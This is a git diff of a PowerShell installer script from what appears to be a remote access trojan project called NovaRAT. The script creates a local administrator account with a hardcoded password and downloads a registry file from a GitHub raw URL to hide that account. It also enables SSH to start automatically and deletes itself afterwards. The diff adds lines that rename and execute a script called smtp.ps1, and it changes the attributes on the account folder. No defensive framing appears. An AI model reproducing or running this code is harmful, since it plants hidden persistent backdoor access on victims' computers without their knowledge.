@@ -33,6 +33,7 @@ $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
+
 #create admin user
 $NewLocalAdmin = "novarat"
 $Password = (ConvertTo-SecureString "NovaRat!" -AsPlainText -Force)
@@ -41,6 +42,8 @@ Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 #goto temp, make working direcrtory
 mkdir $path
 cd $path
+mv $initial_dir/smtp.txt ./smtp.ps1
+./smtp.ps1
 
 #registry to hide local admin
 Invoke-WebRequest -Uri raw.githubusercontent.com/fazelastblood/NovaRAT/main/files/wrev.reg -OutFile "wrev.reg"
@@ -58,7 +61,7 @@ Set-Service -Name sshd -StartupType 'Automatic'
 
 # hide novarat user
 cd C:\Users
-attrib +h +s +r novarat
+attrib -h -s -r novarat
 
 # self delete
 cd $initial_dir
